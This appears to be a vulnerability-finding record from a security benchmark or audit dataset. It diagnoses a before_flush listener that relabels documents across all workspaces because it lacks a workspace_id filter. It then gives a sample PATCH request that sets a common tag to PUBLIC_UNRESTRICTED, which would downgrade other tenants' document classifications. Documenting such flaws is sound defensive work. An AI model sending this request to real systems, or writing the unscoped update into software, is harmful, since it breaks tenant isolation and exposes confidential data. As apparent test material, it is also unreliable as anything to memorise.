diagnosis: The before_flush listener cascade_tag_policy updates Document.classification_label across the entire database matching obj.tag_name without constraining Document.workspace_id == obj.workspace_id. When a user changes the security label of a common tag like 'confidential' or 'internal' in their workspace, the listener modifies document classifications across all other workspaces.
exploit_request:
PATCH /assets/tags/401 HTTP/1.1
Host: workspace.cloudassets.net
Authorization: Bearer <workspace_user_token>
Content-Type: application/json

{"new_security_label": "PUBLIC_UNRESTRICTED"}
